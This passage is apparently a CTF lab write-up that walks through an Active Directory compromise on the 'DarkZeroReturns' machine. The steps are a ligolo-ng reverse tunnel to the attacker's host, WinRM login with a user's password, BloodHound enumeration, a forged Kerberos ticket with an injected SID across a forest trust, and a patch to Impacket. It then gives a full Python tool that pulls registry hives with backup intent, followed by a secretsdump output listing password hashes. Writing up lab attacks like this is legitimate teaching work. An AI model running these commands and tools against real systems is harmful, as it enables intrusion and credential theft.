/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                              
        /____/                          /____/                                               
                                                                                             
  Made in France ♥            by @Nicocha30!                                                 
  Version: dev                                                                               
                                                                                             
ligolo-ng »
```

Then, from our root shell on `SRV01`, launch the corresponding agent that dials back to our proxy:

```shell
root@SRV01:/tmp# nohup ./agent -connect 10.10.14.32:11601 -ignore-cert >/dev/null 2>&1 & disown
[1] 2370
```

Back on our listener, the agent connects in:

```shell
ligolo-ng » INFO[0213] Agent joined.                                 id=00155df47c02 name=root@SRV01 remote="10.129.43.59:57440"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - root@SRV01 - 10.129.43.59:57440 - 00155df47c02
[Agent : root@SRV01] » 
[Agent : root@SRV01] » start
INFO[0242] Starting tunnel to root@SRV01 (00155df47c02) 
[Agent : root@SRV01] » 
```

Let's confirm the tunnel actually lets us reach the internal domain controllers:

```shell
┌──(kuroshiro㉿a1sberg)-[~/ligolo-ng]
└─$ nxc smb 172.16.20.0/24                                                      
SMB         172.16.20.2     445    DC02             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Now we can reach both domain controllers directly. There's also something worth noticing here: `DC01` reports its domain as `darkzero.htb`, while `DC02` reports `darkzero.ext` — **two different domains**. We'll come back to why that matters shortly. Let's update our hosts file accordingly:

```text
172.16.20.2    DC02.darkzero.ext darkzero.ext DC02 gitea.darkzero.ext
172.16.20.1    DC01.darkzero.htb darkzero.htb DC01
```

Let's test `celia`'s credentials against both domains:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ nxc ldap DC01.darkzero.htb -u celia -p babygurl13
LDAP        172.16.20.1     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (signing:Enforced) (channel binding:When Supported)
LDAP        172.16.20.1     389    DC01             [-] darkzero.htb\celia:babygurl13 
                                                                                                                                                 
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ nxc ldap DC02.darkzero.ext -u celia -p babygurl13
LDAP        172.16.20.2     389    DC02             [*] Windows 11 / Server 2025 Build 26100 (name:DC02) (domain:darkzero.ext) (signing:Enforced) (channel binding:When Supported)
LDAP        172.16.20.2     389    DC02             [+] darkzero.ext\celia:babygurl13 (Pwn3d!)
```

Confirmed — `celia` is a valid `darkzero.ext` domain user (she doesn't exist in `darkzero.htb`), and nxc's "Pwn3d!" tag means these credentials also grant WinRM access. Let's connect:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ evil-winrm -i DC02.darkzero.ext -u celia -p babygurl13
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\celia\Documents> 
```

We now have an interactive PowerShell session on `DC02` as `celia`. Let's use this access to run **SharpHound**, the data-collection tool for **BloodHound**, which maps out AD users, groups, permissions, and trust relationships so we can spot attack paths that aren't obvious from manual enumeration.

```powershell
*Evil-WinRM* PS C:\programdata> .\SharpHound.exe -c all
2026-09-10T11:54:05.9486062-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-09-10T11:54:05.9788322-07:00|INFORMATION|SharpHound Version: 2.14.0.0
2026-09-10T11:54:05.9804504-07:00|INFORMATION|SharpHound Common Version: 4.7.0.0
2026-09-10T11:54:06.1314479-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-09-10T11:54:06.1650567-07:00|INFORMATION|Initializing SharpHound at 11:54 AM on 9/10/2026
2026-09-10T11:54:06.2681035-07:00|INFORMATION|Resolved current domain to darkzero.ext
2026-09-10T11:54:06.5400964-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-09-10T11:54:06.6652636-07:00|INFORMATION|Beginning LDAP search for darkzero.ext
2026-09-10T11:54:06.6672876-07:00|INFORMATION|Collecting AdminSDHolder data for darkzero.ext
2026-09-10T11:54:06.7304859-07:00|INFORMATION|AdminSDHolder ACL hash 52BD0F33414F3742981D43692743F02F9356CB4A calculated for darkzero.ext.
2026-09-10T11:54:06.8787033-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.8807227-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.8787033-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9325378-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9342942-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9484084-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9541996-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9582415-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9660502-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9700780-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9819488-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9940868-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:06.9940868-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.0059493-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.4507755-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.4706969-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.6357499-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.6478397-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.6512682-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.6633679-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.6671483-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.6792481-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.6810108-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.6931139-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.6968946-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7090059-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7127918-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7248886-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7269065-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7387516-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7407706-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7546263-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7566459-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7705187-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7783478-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7864183-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.7922241-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.8260563-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.8341417-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.8361579-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.8738650-07:00|INFORMATION|Beginning LDAP search for darkzero.ext Configuration NC
2026-09-10T11:54:07.8917690-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:07.9056266-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:08.3554191-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:08.3554191-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:08.3574370-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:08.3892086-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:08.3975249-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:08.3991303-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:08.3995404-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:08.4076016-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DARKZERO.EXT
2026-09-10T11:54:12.2449696-07:00|INFORMATION|Producer has finished, closing LDAP channel
2026-09-10T11:54:12.2469820-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-09-10T11:54:23.9459512-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-09-10T11:54:23.9684178-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-09-10T11:54:24.1348601-07:00|INFORMATION|Status: 365 objects finished (+365 21.47059)/s -- Using 57 MB RAM
2026-09-10T11:54:24.1368720-07:00|INFORMATION|Enumeration finished in 00:00:17.4914079
2026-09-10T11:54:24.2429543-07:00|INFORMATION|Saving cache with stats: 21 ID to type mappings.
 2 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2026-09-10T11:54:24.2714447-07:00|INFORMATION|SharpHound Enumeration Completed at 11:54 AM on 9/10/2026! Happy Graphing!
```

## Phase 9: Analyzing the Domain with BloodHound

Now let's load the collected data into `BloodHound` and look for paths to Domain Admin.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FgdFCVTQKlDOcAG87awCe%252FScreenshot%2520%283327%29.png%3Falt%3Dmedia%26token%3Dd1653983-73f1-46ef-9ad4-0ec7ef2454f3&width=768&dpr=3&quality=100&sign=2d3d7ee5f1cb2bc21dc804e036d8b5e9&sv=3)

The graph shows `celia` is a direct member of **Domain Admins**, and Domain Admins has `AdminTo` rights over `DC02` — so she effectively already has full administrative control of that one domain controller. However, there's a catch: a **DCSync** attack (extracting every credential in the domain by impersonating a domain controller during replication) isn't automatically available just because you're a Domain Admin. DCSync specifically requires the AD replication rights `Replicating Directory Changes` and `Replicating Directory Changes All` on the domain object — and those appear to be missing or restricted here, even for Domain Admins. So we need another path forward: checking object ownership, other ACL edges, active sessions, or delegation relationships.

There's also a second important detail on the graph: a **CrossForestTrust** relationship from `darkzero.htb` (the forest with `DC01`) to `darkzero.ext` (the forest with `DC02`). This means `darkzero.htb` trusts `darkzero.ext` — so, depending on the direction of trust and SID filtering rules, principals authenticated in `darkzero.ext` may be able to authenticate into resources on `darkzero.htb`. That opens up potential cross-forest attack paths.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FLfbGISH8pJ1nRQYcFN7r%252FScreenshot%2520%283329%29.png%3Falt%3Dmedia%26token%3D221905fa-884e-4b85-bd64-09b9c363e20b&width=768&dpr=3&quality=100&sign=2b3cd038411024eb7a54562b48f8f560&sv=3)

Two "Domain Admin equivalent" primitives are in play here, and it's worth being precise about what each one actually gets us:

- **Forging tickets with the `darkzero.ext` KRBTGT hash** (once we have it) lets us impersonate any `darkzero.ext` user across the forest trust — including injecting a foreign SID to claim membership in privileged groups on the *other* side of the trust. But this only grants access *as an identity from `darkzero.ext`*; it doesn't hand us native Domain Admin rights *inside* `darkzero.htb`, because we'd be missing `darkzero.htb`'s own KRBTGT key needed to forge a fully native Golden Ticket there.
- **Membership in `Backup Operators`** grants `SeBackupPrivilege`, which lets certain file-system ACL checks be bypassed for backup operations — but that's a completely different privilege from DCSync. It has nothing to do with AD replication rights, so being in `Backup Operators` alone won't let us dump domain credentials via DCSync.

In short: neither of these alone is a full "win button" — we'll need to combine techniques. Let's start by forging an AES-based Kerberos ticket for `celia` using the domain's `krbtgt` key (which we'll obtain shortly via credential dumping — see below for how we got it):

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ impacket-ticketer -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 -domain-sid S-1-5-21-2850783758-1231244658-2051857529 -domain darkzero.ext -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 -user-id 1109 celia
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkzero.ext/celia
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in celia.ccache
```

> **Note on ordering:** the `krbtgt` AES key used above actually comes from the credential-dumping step further down (Phase 11). It's shown here first because this is where it gets *used* to build the cross-forest attack — the writeup circles back to fill in that detail once the dump results are available.

## Phase 10: Crossing the Forest Trust

With a forged ticket for `celia` carrying an injected SID for the trusted forest, we can now request a service ticket that lets us step across the `darkzero.ext` → `darkzero.htb` trust boundary:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ impacket-getST -k -no-pass -dc-ip 172.16.20.2 -spn 'krbtgt/DARKZERO.HTB' 'darkzero.ext/celia' 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in celia@krbtgt_DARKZERO.HTB@DARKZERO.EXT.ccache

┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ export KRB5CCNAME=celia@krbtgt_DARKZERO.HTB@DARKZERO.EXT.ccache

┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ impacket-getST -k -no-pass -dc-ip 172.16.20.1 -spn 'cifs/dc01.darkzero.htb' 'darkzero.htb/celia'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in celia@cifs_dc01.darkzero.htb@DARKZERO.HTB.ccache

┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ export KRB5CCNAME=celia@cifs_dc01.darkzero.htb@DARKZERO.HTB.ccache
```

Walking through what just happened: first, `impacket-getST` requests a cross-realm service ticket for `krbtgt/DARKZERO.HTB` while authenticating as `celia` from `DARKZERO.EXT` — this is the standard Kerberos mechanism for referring a client across a trust boundary. That ticket gets cached and pointed to via `KRB5CCNAME`.

Then, using *that* ticket, we request a service ticket specifically for the CIFS (SMB) service on `dc01.darkzero.htb` — this is a ticket scoped to `darkzero.htb`, even though our real identity originates from `darkzero.ext`. This is the essence of cross-forest Kerberos movement: we never needed native `darkzero.htb` credentials, only a valid trust relationship and the right sequence of ticket requests.

Let's confirm the resulting ticket actually authenticates to SMB on `DC01`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ nxc smb DC01.darkzero.htb -k --use-kcache
SMB         DC01.darkzero.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC01.darkzero.htb 445    DC01             [+] DARKZERO.EXT\celia from ccache 
```

Confirmed — `celia` (from `DARKZERO.EXT`) now has authenticated SMB access to `DC01` in `DARKZERO.HTB`.

## Phase 11: Extracting Secrets from DC01 via SeBackupPrivilege

With SMB access to `DC01`, the next goal is to grab the `SAM`, `SYSTEM`, and `SECURITY` registry hives — these contain local password hashes and other credential material we can extract offline.

Before that, there's a small compatibility wrinkle to sort out. Let's check how Impacket's SMB3 implementation sets the Kerberos authenticator's realm:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ sudo sed -n '795,802p' /usr/lib/python3/dist-packages/impacket/smb3.py
[sudo] password for kuroshiro: 
        seq_set(apReq,'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = 'DARKZERO.EXT'
        seq_set(authenticator, 'cname', userName.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
```

That code hardcodes the Kerberos authenticator's realm — and in our cross-forest scenario, we need this to correctly reflect `DARKZERO.EXT` (celia's home realm), not whatever value Impacket would derive by default from the target's domain. Since our identity genuinely originates from `DARKZERO.EXT`, we patch the source directly so this realm value is consistent:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ sudo sed -i "s/authenticator\['crealm'\] = domain/authenticator['crealm'] = 'DARKZERO.EXT'/" /usr/lib/python3/dist-packages/impacket/smb3.py
```

With that fixed, let's back up the registry hives on `DC01` using `impacket-reg`, which can trigger the Remote Registry service and save the hives to disk on the target:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ impacket-reg -k -no-pass -dc-ip 172.16.20.1 'darkzero.htb/celia@dc01.darkzero.htb' backup -o 'C:\Windows\Temp'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to C:\Windows\Temp\SAM.save
[*] Saved HKLM\SYSTEM to C:\Windows\Temp\SYSTEM.save
[*] Saved HKLM\SECURITY to C:\Windows\Temp\SECURITY.save
```

The three hives are now sitting in `C:\Windows\Temp` on `DC01`. The next step is retrieving them to our own machine — but this is where things get a bit more involved.

### Why We Need a Custom SMB Client

Here's the subtlety: even though `celia` (through her forged group membership) holds `SeBackupPrivilege` — which is supposed to let a process bypass normal file-permission checks specifically for backup purposes — that privilege isn't automatically applied to *every* SMB operation. Windows only bypasses the file's ACL when the client explicitly signals "I'm requesting this for backup purposes" by setting the `FILE_OPEN_FOR_BACKUP_INTENT` flag on the low-level `SMB2_CREATE` request.

A normal SMB client (like a stock `smbclient` implementation) just issues a plain `SMB2_CREATE`, which gets evaluated against the file's actual DACL as usual — no privilege bypass. So to actually take advantage of `SeBackupPrivilege` and read protected files like the SAM/SYSTEM/SECURITY hives, we need a client that specifically sets the backup-intent flag on the create request. That's exactly what the following custom Python tool does — it's a small SMB client built on top of Impacket's primitives, purpose-built to open remote files with backup semantics and stream them back to disk:

```python
#!/usr/bin/env python3

from __future__ import annotations

import argparse
import logging
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import BinaryIO, Iterable

from impacket.smbconnection import SMBConnection
from impacket.smb3structs import (
    FILE_READ_DATA,
    FILE_SHARE_READ,
    FILE_SHARE_WRITE,
    FILE_OPEN,
)

BACKUP_INTENT = 0x00004000
STREAM_CHUNK = 0x10000
LOGGER = logging.getLogger("lootfetch")


class LootFetchError(Exception):
    pass


class ShareAttachError(LootFetchError):
    pass


class RemoteOpenError(LootFetchError):
    pass


class TransferError(LootFetchError):
    pass


@dataclass(frozen=True)
class TargetSpec:
    host: str
    dc_ip: str
    kdc: str
    realm: str
    principal: str
    share: str
    remote_path: str
    local_path: Path

    @classmethod
    def from_argv(cls, argv: list[str] | None = None) -> "TargetSpec":
        parser = _build_parser()
        ns = parser.parse_args(argv)
        return cls(
            host=ns.host,
            dc_ip=ns.dc_ip,
            kdc=ns.kdc,
            realm=ns.realm,
            principal=ns.principal,
            share=ns.share,
            remote_path=ns.remote_path,
            local_path=Path(ns.local_path).expanduser().resolve(),
        )


def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="smb_lootfetch",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--host", required=True)
    p.add_argument("--dc-ip", required=True)
    p.add_argument("--kdc", required=True)
    p.add_argument("--realm", required=True)
    p.add_argument("--principal", required=True)
    p.add_argument("--share", required=True)
    p.add_argument("--remote-path", required=True)
    p.add_argument("--local-path", required=True)
    p.add_argument("-v", "--verbose", action="count", default=0)
    return p


class LootFetcher:
    def __init__(self, spec: TargetSpec):
        self._spec = spec
        self._conn: SMBConnection | None = None
        self._tree_id: int | None = None
        self._file_id: int | None = None

    def __enter__(self) -> "LootFetcher":
        self._open_session()
        return self

    def __exit__(self, exc_type, exc, tb) -> None:
        self._cleanup()

    def _open_session(self) -> None:
        LOGGER.debug("dialing %s (DC=%s)", self._spec.host, self._spec.dc_ip)
        self._conn = SMBConnection(
            remoteName=self._spec.host,
            remoteHost=self._spec.dc_ip,
            sess_port=445,
        )
        self._kerberos_login()
        self._attach_share()

    def _kerberos_login(self) -> None:
        assert self._conn is not None
        LOGGER.debug(
            "performing Kerberos login as %s@%s",
            self._spec.principal,
            self._spec.realm,
        )
        self._conn.kerberosLogin(
            user=self._spec.principal,
            password="",
            domain=self._spec.realm,
            useCache=True,
        )

    def _attach_share(self) -> None:
        assert self._conn is not None
        try:
            self._tree_id = self._conn.connectTree(self._spec.share)
        except Exception as exc:
            raise ShareAttachError(
                f"could not attach to share {self._spec.share!r}: {exc}"
            ) from exc
        LOGGER.info(
            "attached to share %r (tree id=%s)",
            self._spec.share,
            self._tree_id,
        )

    def _open_remote_file(self) -> None:
        assert self._conn is not None and self._tree_id is not None
        server = self._conn.getSMBServer()
        try:
            self._file_id = server.create(
                self._tree_id,
                self._spec.remote_path,
                FILE_READ_DATA,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                BACKUP_INTENT,
                FILE_OPEN,
                0,
            )
        except Exception as exc:
            raise RemoteOpenError(
                f"could not open {self._spec.remote_path!r} on "
                f"{self._spec.share!r}: {exc}"
            ) from exc
        LOGGER.info("opened remote file with backup intent (fid=%s)", self._file_id)

    def _iter_chunks(self) -> Iterable[bytes]:
        assert self._conn is not None
        assert self._tree_id is not None and self._file_id is not None
        server = self._conn.getSMBServer()
        offset = 0
        while True:
            try:
                chunk = server.read(
                    self._tree_id, self._file_id, offset, STREAM_CHUNK
                )
            except Exception as exc:
                if _is_end_of_file(exc):
                    LOGGER.debug("reached EOF at offset %d", offset)
                    return
                raise TransferError(
                    f"read failed at offset {offset}: {exc}"
                ) from exc
            if not chunk:
                LOGGER.debug("empty read at offset %d; stopping", offset)
                return
            yield chunk
            offset += len(chunk)

    def _write_to(self, sink: BinaryIO) -> int:
        total = 0
        for chunk in self._iter_chunks():
            sink.write(chunk)
            total += len(chunk)
        return total

    def _close_remote(self) -> None:
        if self._conn is None or self._tree_id is None or self._file_id is None:
            return
        try:
            self._conn.getSMBServer().close(self._tree_id, self._file_id)
        except Exception as exc:
            LOGGER.warning("failed to close remote file handle: %s", exc)
        finally:
            self._file_id = None

    def _cleanup(self) -> None:
        self._close_remote()
        if self._conn is not None:
            try:
                self._conn.close()
            except Exception:
                pass
            self._conn = None

    def fetch(self) -> int:
        self._open_remote_file()
        dest = self._spec.local_path
        dest.parent.mkdir(parents=True, exist_ok=True)
        LOGGER.info("writing to %s", dest)
        with open(dest, "wb") as fh:
            written = self._write_to(fh)
        LOGGER.info(
            "fetched %d bytes (%s -> %s)",
            written,
            self._spec.remote_path,
            dest,
        )
        return written


def _is_end_of_file(exc: BaseException) -> bool:
    text = str(exc)
    return "STATUS_END_OF_FILE" in text or "STATUS_PIPE_ENDED" in text


def _configure_logging(verbosity: int) -> None:
    level = logging.WARNING
    if verbosity == 1:
        level = logging.INFO
    elif verbosity >= 2:
        level = logging.DEBUG
    logging.basicConfig(
        level=level,
        format="[%(levelname)s] %(name)s: %(message)s",
    )


def _peek_verbosity(argv: list[str] | None) -> int:
    args = argv if argv is not None else sys.argv[1:]
    return args.count("-v") + args.count("--verbose")


def main(argv: list[str] | None = None) -> int:
    spec = TargetSpec.from_argv(argv)
    _configure_logging(_peek_verbosity(argv))
    try:
        with LootFetcher(spec) as fetcher:
            fetcher.fetch()
    except LootFetchError as exc:
        LOGGER.error("%s", exc)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

The key part of this script is `_open_remote_file()`: it calls `server.create()` with the `BACKUP_INTENT` flag (`0x00004000`) explicitly set. That single flag is what tells Windows to honor `SeBackupPrivilege` and skip the normal ACL check — without it, this whole approach wouldn't work, no matter what privileges `celia` has.

Now let's actually pull down all three hives:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ python3 getter.py --host dc01.darkzero.htb --dc-ip 172.16.20.1 --kdc 172.16.20.2 --realm DARKZERO.EXT --principal celia --share 'C$' --remote-path 'Windows\Temp\SAM.save' --local-path dc01_SAM.save

┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ python3 getter.py --host dc01.darkzero.htb --dc-ip 172.16.20.1 --kdc 172.16.20.2 --realm DARKZERO.EXT --principal celia --share 'C$' --remote-path 'Windows\Temp\SYSTEM.save' --local-path dc01_SYSTEM.save

┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ python3 getter.py --host dc01.darkzero.htb --dc-ip 172.16.20.1 --kdc 172.16.20.2 --realm DARKZERO.EXT --principal celia --share 'C$' --remote-path 'Windows\Temp\SECURITY.save' --local-path dc01_SECURITY.save
```

With all three hives sitting locally, `impacket-secretsdump` can now parse them offline and extract every credential they contain:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ impacket-secretsdump -sam dc01_SAM.save -security dc01_SECURITY.save -system dc01_SYSTEM.save LOCAL 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd7104de0ccfc39117fa0498a3dfbd8a3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:e34b7c135478de67b873d79887d8bf675517fdf4e47d889bb6d79652abb7e496e46b1b15e4406d8e793b4f920423e7ba161eae73f083a6f7e7bf22faf9b017ac5cf7244d90e6e0ac46031e77a34598d073ef8286133f166ea75a34162ff9d21d41f2c57810a6fc936cfbc4205a3f4dd77796ceb4bdc410378f5e33418a3e392141e44b8d0598bfc03a68f70b6f8a8ab5a380ec60f9ce5a60076983ba972c18241266579a1d28d91241e804c766622b0dbe448b8513825c44e2e286840367280fa05d2d69860806f24f392ef98c0b68efc66dcef05f0cd0c30139837848d12a8bc1b64307f63495453d67a2dbbb5f8817
